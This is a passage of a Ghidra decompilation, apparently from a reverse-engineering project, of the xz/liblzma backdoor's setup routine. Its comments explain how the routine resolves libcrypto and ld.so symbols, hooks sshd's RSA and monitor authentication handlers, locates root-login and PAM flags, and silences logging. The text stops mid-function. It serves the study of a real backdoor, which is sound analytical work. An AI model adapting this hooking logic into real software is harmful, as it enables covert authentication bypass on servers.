// /home/kali/xzre-ghidra/xzregh/105830_backdoor_setup.c
// Function: backdoor_setup @ 0x105830
// Calling convention: __stdcall
// Prototype: BOOL __stdcall backdoor_setup(backdoor_setup_params_t * params)


/*
 * AutoDoc: Loader workhorse that performs every runtime retrofit. It snapshots the resolver frame/GOT, zeros a local
 * `backdoor_data_t`, parses `_r_debug` via `process_shared_libraries`, hydrates the shared globals + hooks blob from liblzma,
 * refreshes the string-reference catalogue, seeds sshd/log contexts, resolves the libcrypto/ld.so imports (including the
 * `_dl_audit*` tables), runs the sensitive-data and monitor discovery heuristics, locks down the sshlogv handlers, and streams the
 * resulting hook addresses into `secret_data`. On success it flips the audit-state bits, installs the symbind trampoline, and
 * restores the saved lzma allocator; any failure resets the ld.so ctx and lets glibc’s cpuid bookkeeping continue untouched.
 */

#include "xzre_types.h"

BOOL backdoor_setup(backdoor_setup_params_t *params)

{
  global_context_t *ctx;
  imported_funcs_t *imported_funcs;
  u32 *resolved_count_ptr;
  audit_ifaces *audit_ifaces_slot_ptr;
  elf_handles_t *elf_handles;
  uint log_literal_slot;
  u32 auditstate_snapshot;
  u64 *cpuid_got_entry;
  u64 *resolver_frame_addr;
  backdoor_hooks_ctx_t *hooks_ctx_ptr;
  backdoor_hooks_data_t **hooks_data_slot;
  u64 signed_payload_size;
  pfn_RSA_get0_key_t rsa_get0_key_hook_ptr;
  pfn_EVP_PKEY_set1_RSA_t evp_set1_rsa_hook_ptr;
  sshd_monitor_func_t keyverify_hook_entry;
  elf_symbol_get_addr_fn sym_resolver;
  Elf64_Addr symbol_rva;
  Elf64_Ehdr *symbol_module_ehdr;
  sshd_ctx_t *live_sshd_ctx;
  byte *audit_slot_byte;
  u32 *cpuid_leaf_ptr;
  u32 cpuid_ebx;
  u32 cpuid_ecx;
  u32 cpuid_edx;
  BOOL relr_retry_flag;
  elf_info_t *elf_info;
  u8 scratch_reg_index;
  EncodedStringId string_id;
  BOOL probe_success;
  void *text_segment;
  lzma_allocator *libc_allocator;
  pfn_malloc_usable_size_t malloc_usable_size_stub;
  lzma_allocator *libcrypto_allocator;
  elf_info_t *search_image;
  pfn_EVP_MD_CTX_new_t evp_md_ctx_new_alloc;
  void *data_segment;
  elf_functions_t *elf_functions_table;
  pfn_BN_free_t bn_free_stub;
  Elf64_Sym *bn_bin2bn_symbol;
  char *string_cursor;
  pfn_BN_bn2bin_t bn_bn2bin_stub;
  Elf64_Sym *bn_dup_symbol;
  Elf64_Sym *rsa_free_symbol;
  pfn_RSA_set0_key_t rsa_set0_key_stub;
  Elf64_Sym *rsa_sign_symbol;
  u8 *authprobe_func_end;
  Elf64_Rela *mem_address;
  int *auth_log_reloc;
  log_handler_fn *pplVar45;
  log_handler_fn *pplVar46;
  long loop_idx;
  log_handler_fn *pplVar48;
  Elf64_Ehdr *string_begin;
  log_handler_fn *addr1;
  backdoor_data_t *backdoor_data_zero_cursor;
  elf_entry_ctx_t *entry_ctx_ptr;
  global_context_t *global_ctx_cursor;
  backdoor_hooks_data_t *hooks_data_cursor;
  sshd_ctx_t *sshd_ctx_cursor;
  sshd_log_ctx_t *sshd_log_ctx_ptr;
  imported_funcs_t *imported_funcs_cursor;
  dasm_ctx_t *decode_ctx_cursor;
  audit_ifaces *audit_ifaces_zero_cursor;
  u8 mov_src_reg;
  u8 mov_dst_reg;
  u8 *scan_cursor;
  sshd_monitor_func_t *authprobe_func_start;
  int auth_root_vote_count;
  log_handler_fn *addr2;
  u8 wipe_stride;
  string_references_t string_refs;
  backdoor_shared_libraries_data_t shared_maps;
  backdoor_data_t backdoor_data;
  backdoor_hooks_data_t *hooks;
  global_context_t *global_ctx;
  u8 *local_b48;
  log_handler_fn *local_b20;
  backdoor_hooks_data_t *local_b10;
  EncodedStringId local_acc;
  ptrdiff_t local_ac8;
  pfn_RSA_public_decrypt_t *local_ac0;
  pfn_EVP_PKEY_set1_RSA_t *local_ab8;
  pfn_RSA_get0_key_t *local_ab0;
  void *local_aa8;
  u64 local_aa0;
  u64 local_a98;
  u64 local_a90;
  main_elf_t local_a88;
  u64 *local_a70;
  backdoor_shared_libraries_data_t local_a68;
  dasm_ctx_t local_a30;
  dasm_ctx_t local_9d8;
  backdoor_data_t local_980;
  
  wipe_stride = 0;
  local_acc = 0;
  backdoor_data_zero_cursor = &local_980;
  // AutoDoc: Wipe the stack-resident `backdoor_data_t` so every elf handle, link_map slot, and scratch struct starts from zero.
  for (loop_idx = 0x256; loop_idx != 0; loop_idx = loop_idx + -1) {
    *(undefined4 *)&backdoor_data_zero_cursor->sshd_link_map = 0;
    backdoor_data_zero_cursor = (backdoor_data_t *)((long)&backdoor_data_zero_cursor->sshd_link_map + 4);
  }
  elf_handles = &local_980.elf_handles;
  local_980.elf_handles.ldso = &local_980.dynamic_linker_info;
  local_980.elf_handles.libc = &local_980.libc_info;
  local_ac8 = 0;
  local_ac0 = (pfn_RSA_public_decrypt_t *)0x0;
  local_ab8 = (pfn_EVP_PKEY_set1_RSA_t *)0x0;
  local_ab0 = (pfn_RSA_get0_key_t *)0x0;
  local_aa8 = (void *)0x0;
  entry_ctx_ptr = params->entry_ctx;
  local_980.elf_handles.liblzma = &local_980.liblzma_info;
  local_980.elf_handles.libcrypto = &local_980.libcrypto_info;
  local_980.elf_handles.sshd = &local_980.main_info;
  local_980.data_handle.runtime_data = &local_980;
  local_980.data_handle.cached_elf_handles = elf_handles;
  update_got_address(entry_ctx_ptr);
  text_segment = (entry_ctx_ptr->got_ctx).tls_got_entry;
  if (text_segment != (void *)0x0) {
    cpuid_got_entry = *(u64 **)((long)text_segment + (entry_ctx_ptr->got_ctx).cpuid_slot_index * 8 + 0x18);
    resolver_frame_addr = entry_ctx_ptr->resolver_frame;
    loop_idx = (long)resolver_frame_addr - (long)cpuid_got_entry;
    if (resolver_frame_addr <= cpuid_got_entry) {
      loop_idx = (long)cpuid_got_entry - (long)resolver_frame_addr;
    }
    // AutoDoc: Sanity-check that the resolver frame and cpuid GOT slot live near each other; otherwise abort before touching an unrelated GOT entry.
    if (loop_idx < 0x50001) {
      string_begin = (Elf64_Ehdr *)((ulong)cpuid_got_entry & 0xfffffffffffff000);
      symbol_module_ehdr = string_begin + -0x800;
LAB_00105951:
      string_id = get_string_id((char *)string_begin,(char *)0x0);
      if (string_id != STR_ELF) goto code_r0x00105962;
      local_a88.__libc_stack_end = &local_aa8;
      local_a70 = params->entry_ctx->resolver_frame;
      local_a88.elf_handles = elf_handles;
      local_a88.dynamic_linker_ehdr = string_begin;
      probe_success = main_elf_parse(&local_a88);
      if (probe_success != FALSE) {
        local_980.active_lzma_allocator = get_lzma_allocator();
        loop_idx = 0;
        do {
          *(undefined1 *)((long)&local_980.saved_lzma_allocator.alloc + loop_idx) =
               *(undefined1 *)((long)&(local_980.active_lzma_allocator)->alloc + loop_idx);
          loop_idx = loop_idx + 1;
        } while (loop_idx != 0x18);
        local_a68.rsa_public_decrypt_slot = &local_ac0;
        local_a68.evp_set1_rsa_slot = &local_ab8;
        local_a68.rsa_get0_key_slot = &local_ab0;
        local_a68.hooks_data_slot = params->hook_ctx->hooks_data_slot_ptr;
        local_a68.shared_maps = &local_980;
        local_a68.elf_handles = elf_handles;
        local_a68.libc_imports = &local_980.libc_imports;
        // AutoDoc: Walk `_r_debug` to populate the live module handles and capture the hook entries that will later be written back into liblzma.
        probe_success = process_shared_libraries(&local_a68);
        if (probe_success == FALSE) goto LAB_00105a59;
        local_b10 = *params->hook_ctx->hooks_data_slot_ptr;
        ctx = &local_b10->global_ctx;
        imported_funcs = &local_b10->imported_funcs;
        global_ctx_cursor = ctx;
        for (loop_idx = 0x5a; loop_idx != 0; loop_idx = loop_idx + -1) {
          global_ctx_cursor->uses_endbr64 = FALSE;
          global_ctx_cursor = (global_context_t *)((long)global_ctx_cursor + (ulong)wipe_stride * -8 + 4);
        }
        (local_b10->global_ctx).sshd_log_ctx = &local_b10->sshd_log_ctx;
        hooks_ctx_ptr = params->hook_ctx;
        (local_b10->global_ctx).imported_funcs = imported_funcs;
        (local_b10->global_ctx).sshd_ctx = &local_b10->sshd_ctx;
        hooks_data_slot = hooks_ctx_ptr->hooks_data_slot_ptr;
        (local_b10->global_ctx).libc_imports = &local_b10->libc_imports;
        hooks_data_cursor = *hooks_data_slot;
        signed_payload_size = hooks_data_cursor->signed_data_size;
        (local_b10->global_ctx).payload_bytes_buffered = 0;
        (local_b10->global_ctx).payload_buffer = &hooks_data_cursor->signed_data;
        (local_b10->global_ctx).payload_buffer_size = signed_payload_size;
        elf_find_string_references(&local_980.main_info,&local_980.sshd_string_refs);
        local_aa0 = 0;
        text_segment = elf_get_code_segment(local_980.elf_handles.liblzma,&local_aa0);
        if (text_segment != (void *)0x0) {
          (local_b10->global_ctx).liblzma_text_start = text_segment;
          (local_b10->global_ctx).liblzma_text_end = (void *)((long)text_segment + local_aa0);
          hooks_data_cursor = local_b10;
          for (loop_idx = 0x4e; loop_idx != 0; loop_idx = loop_idx + -1) {
            (hooks_data_cursor->ldso_ctx)._unknown1459[0] = '\0';
            (hooks_data_cursor->ldso_ctx)._unknown1459[1] = '\0';
            (hooks_data_cursor->ldso_ctx)._unknown1459[2] = '\0';
            (hooks_data_cursor->ldso_ctx)._unknown1459[3] = '\0';
            hooks_data_cursor = (backdoor_hooks_data_t *)((long)hooks_data_cursor + (ulong)wipe_stride * -8 + 4);
          }
          hooks_ctx_ptr = params->hook_ctx;
          (local_b10->ldso_ctx).imported_funcs = imported_funcs;
          rsa_get0_key_hook_ptr = hooks_ctx_ptr->rsa_get0_key_entry;
          (local_b10->ldso_ctx).hook_RSA_public_decrypt = hooks_ctx_ptr->rsa_public_decrypt_entry;
          evp_set1_rsa_hook_ptr = params->shared_globals->evp_set1_rsa_hook_entry;
          (local_b10->ldso_ctx).hook_RSA_get0_key = rsa_get0_key_hook_ptr;
          (local_b10->ldso_ctx).hook_EVP_PKEY_set1_RSA = evp_set1_rsa_hook_ptr;
          sshd_ctx_cursor = &local_b10->sshd_ctx;
          for (loop_idx = 0x38; loop_idx != 0; loop_idx = loop_idx + -1) {
            sshd_ctx_cursor->have_mm_answer_keyallowed = FALSE;
            sshd_ctx_cursor = (sshd_ctx_t *)((long)sshd_ctx_cursor + (ulong)wipe_stride * -8 + 4);
          }
          (local_b10->sshd_ctx).mm_answer_authpassword_hook =
               params->shared_globals->authpassword_hook_entry;
          keyverify_hook_entry = params->hook_ctx->mm_answer_keyverify_entry;
          (local_b10->sshd_ctx).mm_answer_keyallowed_hook =
               params->hook_ctx->mm_answer_keyallowed_entry;
          (local_b10->sshd_ctx).mm_answer_keyverify_hook = keyverify_hook_entry;
          sshd_log_ctx_ptr = &local_b10->sshd_log_ctx;
          for (loop_idx = 0x1a; loop_idx != 0; loop_idx = loop_idx + -1) {
            sshd_log_ctx_ptr->log_squelched = FALSE;
            sshd_log_ctx_ptr = (sshd_log_ctx_t *)((long)sshd_log_ctx_ptr + (ulong)wipe_stride * -8 + 4);
          }
          (local_b10->sshd_log_ctx).log_hook_entry = params->hook_ctx->mm_log_handler_entry;
          *params->shared_globals->global_ctx_slot = ctx;
          imported_funcs_cursor = imported_funcs;
          for (loop_idx = 0x4a; loop_idx != 0; loop_idx = loop_idx + -1) {
            *(undefined4 *)&imported_funcs_cursor->RSA_public_decrypt_orig = 0;
            imported_funcs_cursor = (imported_funcs_t *)((long)imported_funcs_cursor + (ulong)wipe_stride * -8 + 4);
          }
          (local_b10->imported_funcs).RSA_public_decrypt_plt = local_ac0;
          (local_b10->imported_funcs).EVP_PKEY_set1_RSA_plt = local_ab8;
          (local_b10->imported_funcs).RSA_get0_key_plt = local_ab0;
          loop_idx = 0;
          do {
            (local_b10->sshd_log_ctx).reserved_alignment[loop_idx + -0x7c] =
                 *(u8 *)((long)&local_980.libc_imports.resolved_imports_count + loop_idx);
            loop_idx = loop_idx + 1;
          } while (loop_idx != 0x70);
          (local_b10->imported_funcs).libc = &local_b10->libc_imports;
          (local_b10->libc_imports).__libc_stack_end = local_aa8;
          libc_allocator = get_lzma_allocator();
          libc_allocator->opaque = local_980.elf_handles.libc;
          malloc_usable_size_stub = (pfn_malloc_usable_size_t)lzma_alloc(0x440,libc_allocator);
          (local_b10->libc_imports).malloc_usable_size = malloc_usable_size_stub;
          if (malloc_usable_size_stub != (pfn_malloc_usable_size_t)0x0) {
            (local_b10->libc_imports).resolved_imports_count =
                 (local_b10->libc_imports).resolved_imports_count + 1;
          }
          // AutoDoc: Resolve `_dl_audit*` metadata plus the `link_map` displacement before patching ld.so’s audit tables.
          probe_success = find_dl_audit_offsets(&local_980.data_handle,&local_ac8,local_b10,imported_funcs)
          ;
          if (probe_success == FALSE) goto LAB_00105a60;
          libcrypto_allocator = get_lzma_allocator();
          libcrypto_allocator->opaque = local_980.elf_handles.libcrypto;
          search_image = local_980.elf_handles.libcrypto;
          if (local_980.elf_handles.libcrypto != (elf_info_t *)0x0) {
            search_image = (elf_info_t *)
                      elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_get0_key,0);
            evp_md_ctx_new_alloc = (pfn_EVP_MD_CTX_new_t)lzma_alloc(0xaf8,libcrypto_allocator);
            (local_b10->imported_funcs).EVP_MD_CTX_new = evp_md_ctx_new_alloc;
            if (evp_md_ctx_new_alloc != (pfn_EVP_MD_CTX_new_t)0x0) {
              resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
              *resolved_count_ptr = *resolved_count_ptr + 1;
            }
          }
          elf_info = local_980.elf_handles.sshd;
          local_a30.instruction = (u8 *)0x0;
          local_9d8.instruction = (u8 *)0x0;
          text_segment = elf_get_code_segment(local_980.elf_handles.sshd,(u64 *)&local_a30);
          scan_cursor = local_a30.instruction + (long)text_segment;
          data_segment = elf_get_data_segment(elf_info,(u64 *)&local_9d8,FALSE);
          (local_b10->global_ctx).sshd_text_start = text_segment;
          (local_b10->global_ctx).sshd_text_end = scan_cursor;
          (local_b10->global_ctx).sshd_data_start = data_segment;
          (local_b10->global_ctx).sshd_data_end = local_9d8.instruction + (long)data_segment;
          elf_functions_table = get_elf_functions_address();
          if (((elf_functions_table == (elf_functions_t *)0x0) ||
              (sym_resolver = elf_functions_table->elf_symbol_get_addr, sym_resolver == (elf_symbol_get_addr_fn)0x0)) ||
             (elf_functions_table->elf_parse == (elf_parse_fn)0x0)) goto LAB_00105a60;
          bn_bin2bn_symbol = (Elf64_Sym *)0x0;
          bn_free_stub = (pfn_BN_free_t)(*sym_resolver)(local_980.elf_handles.libcrypto,STR_BN_free);
          (local_b10->imported_funcs).BN_free = bn_free_stub;
          if (bn_free_stub != (pfn_BN_free_t)0x0) {
            bn_bin2bn_symbol = elf_symbol_get(local_980.elf_handles.libcrypto,STR_BN_bin2bn,0);
          }
          local_acc = STR_ssh_rsa_cert_v01_openssh_com;
          string_cursor = elf_find_string(local_980.elf_handles.sshd,&local_acc,(void *)0x0);
          (local_b10->global_ctx).ssh_rsa_cert_alg = string_cursor;
          if (string_cursor == (char *)0x0) goto LAB_00105a60;
          local_acc = STR_rsa_sha2_256;
          string_cursor = elf_find_string(local_980.elf_handles.sshd,&local_acc,(void *)0x0);
          (local_b10->global_ctx).rsa_sha2_256_alg = string_cursor;
          if (string_cursor == (char *)0x0) goto LAB_00105a60;
          bn_dup_symbol = (Elf64_Sym *)0x0;
          bn_bn2bin_stub = (pfn_BN_bn2bin_t)
                    elf_symbol_get_addr(local_980.elf_handles.libcrypto,STR_BN_bn2bin);
          (local_b10->imported_funcs).BN_bn2bin = bn_bn2bin_stub;
          if (bn_bn2bin_stub != (pfn_BN_bn2bin_t)0x0) {
            bn_dup_symbol = elf_symbol_get(local_980.elf_handles.libcrypto,STR_BN_dup,0);
            if (bn_dup_symbol != (Elf64_Sym *)0x0) {
              symbol_rva = bn_dup_symbol->st_value;
              symbol_module_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
              resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
              *resolved_count_ptr = *resolved_count_ptr + 1;
              (local_b10->imported_funcs).BN_dup = (pfn_BN_dup_t)(symbol_module_ehdr->e_ident + symbol_rva);
            }
            bn_dup_symbol = elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_new,0);
            if ((local_b10->imported_funcs).BN_free != (pfn_BN_free_t)0x0) {
              resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
              *resolved_count_ptr = *resolved_count_ptr + 1;
            }
          }
          rsa_free_symbol = elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_free,0);
          rsa_set0_key_stub = (pfn_RSA_set0_key_t)(*sym_resolver)(local_980.elf_handles.libcrypto,STR_RSA_set0_key)
          ;
          rsa_sign_symbol = (Elf64_Sym *)0x0;
          (local_b10->imported_funcs).RSA_set0_key = rsa_set0_key_stub;
          if (rsa_set0_key_stub != (pfn_RSA_set0_key_t)0x0) {
            resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
            *resolved_count_ptr = *resolved_count_ptr + 1;
            rsa_sign_symbol = elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_sign,0);
            if (search_image != (elf_info_t *)0x0) {
              symbol_rva = search_image->load_base_vaddr;
              symbol_module_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
              resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
              *resolved_count_ptr = *resolved_count_ptr + 1;
              (local_b10->imported_funcs).RSA_get0_key_resolved =
                   (pfn_RSA_get0_key_t)(symbol_module_ehdr->e_ident + symbol_rva);
            }
          }
          if ((local_b10->imported_funcs).BN_bn2bin != (pfn_BN_bn2bin_t)0x0) {
            resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
            *resolved_count_ptr = *resolved_count_ptr + 1;
          }
          // AutoDoc: Score sshd’s sensitive-data heuristics so the payload handlers know where to read/write secrets.
          probe_success = sshd_find_sensitive_data
                             (local_980.elf_handles.sshd,local_980.elf_handles.libcrypto,
                              &local_980.sshd_string_refs,imported_funcs,ctx);
          if (probe_success == FALSE) goto LAB_00105a60;
          if (bn_bin2bn_symbol != (Elf64_Sym *)0x0) {
            symbol_rva = bn_bin2bn_symbol->st_value;
            symbol_module_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
            resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
            *resolved_count_ptr = *resolved_count_ptr + 1;
            (local_b10->imported_funcs).BN_bin2bn = (pfn_BN_bin2bn_t)(symbol_module_ehdr->e_ident + symbol_rva);
          }
          if (bn_dup_symbol != (Elf64_Sym *)0x0) {
            symbol_rva = bn_dup_symbol->st_value;
            symbol_module_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
            resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
            *resolved_count_ptr = *resolved_count_ptr + 1;
            (local_b10->imported_funcs).RSA_new = (pfn_RSA_new_t)(symbol_module_ehdr->e_ident + symbol_rva);
          }
          if (rsa_free_symbol != (Elf64_Sym *)0x0) {
            symbol_rva = rsa_free_symbol->st_value;
            symbol_module_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
            resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
            *resolved_count_ptr = *resolved_count_ptr + 1;
            (local_b10->imported_funcs).RSA_free = (pfn_RSA_free_t)(symbol_module_ehdr->e_ident + symbol_rva);
          }
          if (rsa_sign_symbol != (Elf64_Sym *)0x0) {
            symbol_rva = rsa_sign_symbol->st_value;
            symbol_module_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
            resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
            *resolved_count_ptr = *resolved_count_ptr + 1;
            (local_b10->imported_funcs).RSA_sign = (pfn_RSA_sign_t)(symbol_module_ehdr->e_ident + symbol_rva);
          }
          bn_bin2bn_symbol = elf_symbol_get(local_980.elf_handles.libcrypto,STR_EVP_DecryptUpdate,0);
          search_image = local_980.elf_handles.sshd;
          sshd_ctx_cursor = (local_b10->global_ctx).sshd_ctx;
          local_a30.instruction = (u8 *)0x0;
          local_a98 = local_a98 & 0xffffffff00000000;
          sshd_ctx_cursor->have_mm_answer_keyallowed = FALSE;
          sshd_ctx_cursor->have_mm_answer_authpassword = FALSE;
          sshd_ctx_cursor->have_mm_answer_keyverify = FALSE;
          text_segment = elf_get_data_segment(local_980.elf_handles.sshd,(u64 *)&local_a30,FALSE);
          scan_cursor = local_a30.instruction;
          if ((text_segment != (void *)0x0) &&
             (local_980.sshd_string_refs.mm_request_send.func_start != (void *)0x0)) {
            sshd_ctx_cursor->mm_request_send_start = local_980.sshd_string_refs.mm_request_send.func_start;
            sshd_ctx_cursor->mm_request_send_end = local_980.sshd_string_refs.mm_request_send.func_end;
            local_a98 = CONCAT44(*(uint *)((u8 *)&local_a98 + 4),0x400);
            string_cursor = elf_find_string(search_image,(EncodedStringId *)&local_a98,(void *)0x0);
            sshd_ctx_cursor->STR_without_password = string_cursor;
            if ((string_cursor != (char *)0x0) &&
               (probe_success = elf_find_function_pointer
                                   (XREF_mm_answer_authpassword,
                                    &sshd_ctx_cursor->mm_answer_authpassword_start,
                                    &sshd_ctx_cursor->mm_answer_authpassword_end,
                                    &sshd_ctx_cursor->mm_answer_authpassword_slot,search_image,
                                    &local_980.sshd_string_refs,ctx), probe_success == FALSE)) {
              sshd_ctx_cursor->mm_answer_authpassword_start = (sshd_monitor_func_t *)0x0;
              sshd_ctx_cursor->mm_answer_authpassword_end = (void *)0x0;
              sshd_ctx_cursor->mm_answer_authpassword_slot = (sshd_monitor_func_t *)0x0;
            }
            local_a98 = CONCAT44(*(uint *)((u8 *)&local_a98 + 4),0x7b8);
            string_cursor = elf_find_string(search_image,(EncodedStringId *)&local_a98,(void *)0x0);
            sshd_ctx_cursor->STR_publickey = string_cursor;
            if (string_cursor != (char *)0x0) {
              probe_success = elf_find_function_pointer
                                 (XREF_mm_answer_keyallowed,&sshd_ctx_cursor->mm_answer_keyallowed_start,
                                  &sshd_ctx_cursor->mm_answer_keyallowed_end,
                                  &sshd_ctx_cursor->mm_answer_keyallowed_slot,search_image,
                                  &local_980.sshd_string_refs,ctx);
              if (probe_success == FALSE) {
                sshd_ctx_cursor->mm_answer_keyallowed_start = (sshd_monitor_func_t *)0x0;
                sshd_ctx_cursor->mm_answer_keyallowed_end = (void *)0x0;
                sshd_ctx_cursor->mm_answer_keyallowed_slot = (sshd_monitor_func_t *)0x0;
              }
              else {
                probe_success = elf_find_function_pointer
                                   (XREF_mm_answer_keyverify,&sshd_ctx_cursor->mm_answer_keyverify_start,
                                    &sshd_ctx_cursor->mm_answer_keyverify_end,
                                    &sshd_ctx_cursor->mm_answer_keyverify_slot,search_image,
                                    &local_980.sshd_string_refs,ctx);
                if (probe_success == FALSE) {
                  sshd_ctx_cursor->mm_answer_keyverify_start = (sshd_monitor_func_t *)0x0;
                  sshd_ctx_cursor->mm_answer_keyverify_end = (void *)0x0;
                  sshd_ctx_cursor->mm_answer_keyverify_slot = (sshd_monitor_func_t *)0x0;
                }
              }
            }
            if ((sshd_ctx_cursor->mm_answer_authpassword_start != (sshd_monitor_func_t *)0x0) ||
               (sshd_ctx_cursor->mm_answer_keyallowed_start != (sshd_monitor_func_t *)0x0)) {
              live_sshd_ctx = (local_b10->global_ctx).sshd_ctx;
              local_9d8.instruction = (u8 *)0x0;
              authprobe_func_start = live_sshd_ctx->mm_answer_authpassword_start;
              if (authprobe_func_start == (sshd_monitor_func_t *)0x0) {
                authprobe_func_start = live_sshd_ctx->mm_answer_keyallowed_start;
                if (authprobe_func_start == (sshd_monitor_func_t *)0x0) goto LAB_001065af;
                authprobe_func_end = (u8 *)live_sshd_ctx->mm_answer_keyallowed_end;
              }
              else {
                authprobe_func_end = (u8 *)live_sshd_ctx->mm_answer_authpassword_end;
              }
              relr_retry_flag = FALSE;
              string_cursor = (char *)0x0;
              local_a90 = CONCAT44(*(uint *)((u8 *)&local_a90 + 4),0x198);
              while (string_cursor = elf_find_string(search_image,(EncodedStringId *)&local_a90,string_cursor),
                    string_cursor != (char *)0x0) {
                local_9d8.instruction = (u8 *)0x0;
                string_id = (EncodedStringId)string_cursor;
                mem_address = elf_find_rela_reloc(search_image,string_id,(u8 *)0x0);
                if (mem_address == (Elf64_Rela *)0x0) {
                  local_9d8.instruction = (u8 *)0x0;
                  relr_retry_flag = TRUE;
                  mem_address = (Elf64_Rela *)elf_find_relr_reloc(search_image,string_id);
                }
                while (mem_address != (Elf64_Rela *)0x0) {
                  do {
                    probe_success = elf_contains_vaddr_relro(search_image,(u64)mem_address,8,1);
                    if ((probe_success != FALSE) &&
                       (probe_success = find_instruction_with_mem_operand_ex
                                           ((u8 *)authprobe_func_start,authprobe_func_end,(dasm_ctx_t *)0x0,0x109,
                                            mem_address), probe_success != FALSE)) {
                      authprobe_func_start = sshd_ctx_cursor->mm_answer_authpassword_start;
                      ((local_b10->global_ctx).sshd_ctx)->auth_log_fmt_reloc = (char *)mem_address;
                      if (authprobe_func_start != (sshd_monitor_func_t *)0x0) {
                        sshd_ctx_cursor->have_mm_answer_authpassword = TRUE;
                      }
                      if ((sshd_ctx_cursor->mm_answer_keyallowed_start != (sshd_monitor_func_t *)0x0) &&
                         (sshd_ctx_cursor->have_mm_answer_keyallowed = TRUE,
                         sshd_ctx_cursor->mm_answer_keyverify_start != (sshd_monitor_func_t *)0x0)) {
                        sshd_ctx_cursor->have_mm_answer_keyverify = TRUE;
                      }
                      auth_log_reloc = (int *)find_addr_referenced_in_mov_instruction
                                                 (XREF_start_pam,&local_980.sshd_string_refs,text_segment
                                                  ,scan_cursor + (long)text_segment);
                      if (auth_log_reloc != (int *)0x0) {
                        ((local_b10->global_ctx).sshd_ctx)->use_pam_ptr = auth_log_reloc;
                      }
                      decode_ctx_cursor = &local_9d8;
                      relr_retry_flag = FALSE;
                      *(uint *)&local_9d8.instruction_size = 0x70;
                      local_9d8.instruction = (u8 *)0xc5800000948;
                      goto LAB_00106471;
                    }
                    if (relr_retry_flag) goto LAB_001063c8;
                    mem_address = elf_find_rela_reloc(search_image,string_id,(u8 *)0x0);
                  } while (mem_address != (Elf64_Rela *)0x0);
                  local_9d8.instruction = (u8 *)0x0;
LAB_001063c8:
                  mem_address = (Elf64_Rela *)elf_find_relr_reloc(search_image,string_id);
                  relr_retry_flag = TRUE;
                }
                string_cursor = string_cursor + 8;
              }
            }
          }
          goto LAB_001065af;
        }
        goto LAB_00105a60;
      }
    }
  }
LAB_00105a59:
  local_b10 = (backdoor_hooks_data_t *)0x0;
  goto LAB_00105a60;
code_r0x00105962:
  string_begin = string_begin + -0x40;
  if (string_begin == symbol_module_ehdr) goto LAB_00105a59;
  goto LAB_00105951;
LAB_00106471:
  do {
    string_cursor = elf_find_string(search_image,(EncodedStringId *)decode_ctx_cursor,(void *)0x0);
    if (string_cursor != (char *)0x0) {
      if (relr_retry_flag) {
        ((local_b10->global_ctx).sshd_ctx)->auth_root_allowed_flag = 1;
        goto LAB_001064b8;
      }
      relr_retry_flag = TRUE;
    }
    decode_ctx_cursor = (dasm_ctx_t *)((long)&decode_ctx_cursor->instruction + 4);
  } while (decode_ctx_cursor != (dasm_ctx_t *)((long)&local_9d8.instruction_size + 4));
  ((local_b10->global_ctx).sshd_ctx)->auth_root_allowed_flag = 0;
LAB_001064b8:
  auth_log_reloc = (int *)find_addr_referenced_in_mov_instruction
                             (XREF_auth_root_allowed,&local_980.sshd_string_refs,text_segment,
                              scan_cursor + (long)text_segment);
  if (auth_log_reloc != (int *)0x0) {
    if ((((local_b10->global_ctx).sshd_ctx)->auth_root_allowed_flag != 0) &&
       ((local_b10->global_ctx).uses_endbr64 != FALSE)) {
      auth_root_vote_count = 0;
      loop_idx = 0;
      *(uint *)&local_9d8.instruction_size = 0x10;
      local_9d8.instruction = (u8 *)0xf0000000e;
      hooks = (backdoor_hooks_data_t *)0x0;
      do {
        scan_cursor = (u8 *)(&local_980.sshd_string_refs.xcalloc_zero_size)
                        [*(uint *)(local_9d8.opcode_window + loop_idx * 4 + -0x25)].func_start;
        if (scan_cursor != (u8 *)0x0) {
          authprobe_func_end = (u8 *)(&local_980.sshd_string_refs.xcalloc_zero_size)
                          [*(uint *)(local_9d8.opcode_window + loop_idx * 4 + -0x25)].func_end;
          auth_root_vote_count = auth_root_vote_count + 1;
          probe_success = find_instruction_with_mem_operand(scan_cursor,authprobe_func_end,(dasm_ctx_t *)0x0,auth_log_reloc);
          if ((probe_success != FALSE) ||
             (probe_success = find_add_instruction_with_mem_operand
                                 (scan_cursor,authprobe_func_end,(dasm_ctx_t *)0x0,auth_log_reloc), probe_success != FALSE)) {
            hooks = (backdoor_hooks_data_t *)(ulong)((int)hooks + 1);
          }
        }
        loop_idx = loop_idx + 1;
      } while (loop_idx != 3);
      if ((auth_root_vote_count != 0) && ((int)hooks == 0)) goto LAB_001065af;
    }
    ((local_b10->global_ctx).sshd_ctx)->permit_root_login_ptr = auth_log_reloc;
  }
LAB_001065af:
  bn_dup_symbol = elf_symbol_get(local_980.elf_handles.libcrypto,STR_EVP_DecryptFinal_ex,0);
  // AutoDoc: Locate the global monitor struct so the mm hook wrappers can patch sockets, flags, and auth state safely.
  probe_success = sshd_find_monitor_struct(local_980.elf_handles.sshd,&local_980.sshd_string_refs,ctx);
  if (probe_success == FALSE) {
    (local_b10->sshd_ctx).have_mm_answer_keyallowed = FALSE;
    (local_b10->sshd_ctx).have_mm_answer_keyverify = FALSE;
  }
  sshd_log_ctx_ptr = (local_b10->global_ctx).sshd_log_ctx;
  libc_allocator->opaque = local_980.elf_handles.libc;
  local_a98 = 0;
  sshd_log_ctx_ptr->log_squelched = FALSE;
  sshd_log_ctx_ptr->handler_slots_valid = FALSE;
